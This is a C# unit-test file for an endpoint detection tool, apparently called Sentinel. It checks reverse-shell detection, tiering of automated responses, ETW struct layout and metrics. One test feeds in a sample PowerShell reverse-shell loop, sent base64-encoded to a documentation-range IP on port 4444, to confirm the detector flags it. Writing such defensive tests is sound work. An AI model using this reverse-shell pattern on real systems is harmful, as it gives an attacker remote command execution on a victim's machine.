using System;
using System.Text;
using Sentinel.Core;
using Xunit;

namespace Sentinel.Tests
{
    public class OctoberAuditRegressionTests
    {
        private static DetectionEvent Evaluate(string script)
        {
            string command = "powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand " +
                Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            return new ReverseShellRule().Evaluate(new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry { ProcessName = "powershell.exe", ProcessId = 12345, CommandLine = command }
            })!;
        }

        [Fact]
        public void FirewallHelper_RemainsObservational_AndPreservesEncodedEvidence()
        {
            const string script = "$request=$env:SENTINEL_FIREWALL_REQUEST | ConvertFrom-Json; Import-Module NetSecurity; Invoke-SentinelFirewallPolicy $request";
            var detection = Evaluate(script);
            Assert.Equal(DetectionTier.Tier2Indicator, detection.Tier);
            Assert.Equal(ResponseAction.LogOnly, detection.AuthorizedResponse);
            Assert.Contains(Convert.ToBase64String(Encoding.Unicode.GetBytes(script)), detection.Evidence);
        }

        [Fact]
        public void EncodedSocketCommandLoop_StillAuthorizesTerminalResponse()
        {
            var detection = Evaluate("$c=New-Object Net.Sockets.TCPClient('192.0.2.1',4444); $s=$c.GetStream(); while(($n=$s.Read($b,0,1024)) -gt 0){$o=iex $cmd; $s.Write($out,0,$out.Length)}");
            Assert.Equal(DetectionTier.Tier1Behavioral, detection.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, detection.AuthorizedResponse);
        }

        [Theory]
        [InlineData("DriverLoadMonitor: Trojanized GPU Driver Dropped in User Path", 0)]
        [InlineData("PPID Spoofing: Parent PID Mismatch", 12345)]
        public void DirectMonitorClaims_CannotBypassTerminalPolicy(string rule, int pid)
        {
            var detection = new DetectionEvent { RuleName = rule, ProcessId = pid, Confidence = 0.99,
                Tier = DetectionTier.Tier1Behavioral, AuthorizedResponse = ResponseAction.QuarantineAndKill };
            ResponsePolicy.EnforceDispatchPolicy(detection);
            Assert.Equal(DetectionTier.Tier2Indicator, detection.Tier);
            Assert.Equal(ResponseAction.LogOnly, detection.AuthorizedResponse);
        }

        [Fact]
        public void Tier2TerminalLabel_NeverPromotesAtDispatch()
        {
            var detection = new DetectionEvent { RuleName = "ReverseShellRule", ProcessId = 12345,
                SignalType = SignalType.ReverseShell, Confidence = 0.99, Tier = DetectionTier.Tier2Indicator,
                AuthorizedResponse = ResponseAction.KillProcessTree };
            ResponsePolicy.EnforceDispatchPolicy(detection);
            Assert.Equal(ResponseAction.LogOnly, detection.AuthorizedResponse);
        }

        [Fact]
        public void TerminalSignalWithoutProcess_CannotAuthorizeProcessKill()
        {
            var detection = new DetectionEvent { RuleName = "ReverseShellRule", ProcessId = 0,
                SignalType = SignalType.ReverseShell, Confidence = 0.99, Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.KillProcessTree };
            ResponsePolicy.EnforceDispatchPolicy(detection);
            Assert.Equal(ResponseAction.LogOnly, detection.AuthorizedResponse);
        }

        [Theory]
        [InlineData(8, 448, 28, 424)]
        [InlineData(4, 416, 20, 400)]
        public void EtwConsumer_MatchesWindowsSdkLayout(int pointerSize, int size, int mode, int callback)
        {
            var layout = UnifiedEtwSession.ConsumerLayout(pointerSize);
            Assert.Equal(size, layout.Size);
            Assert.Equal(mode, layout.ModeOffset);
            Assert.Equal(callback, layout.CallbackOffset);
        }

        [Fact]
        public void UnmeasuredDetectionLatency_IsMissingRatherThanZero()
        {
            var metrics = new SentinelMetrics();
            metrics.RecordDetectionWithoutLatency();
            var snapshot = metrics.CreateSnapshot();
            Assert.Equal(1, snapshot.DetectionsTotal);
            Assert.Equal(0, snapshot.DetectionLatencySamples);
            Assert.Null(snapshot.DetectionLatencyMsP95);
            metrics.RecordDetection(37);
            Assert.Equal(37d, metrics.CreateSnapshot().DetectionLatencyMsP95);
        }

        [Fact]
        public void LogOnlyOutcome_IsNotVerifiedRemediation()
        {
            var metrics = new SentinelMetrics();
            metrics.RecordResponseOutcome(new ResponseExecutionResult { CompletedAt = DateTimeOffset.UtcNow });
            var snapshot = metrics.CreateSnapshot();
            Assert.Equal(1, snapshot.ResponsesNotRequested);
            Assert.Equal(0, snapshot.ResponsesAttempted);
            Assert.Equal(0, snapshot.ResponsesVerified);
        }
    }
}
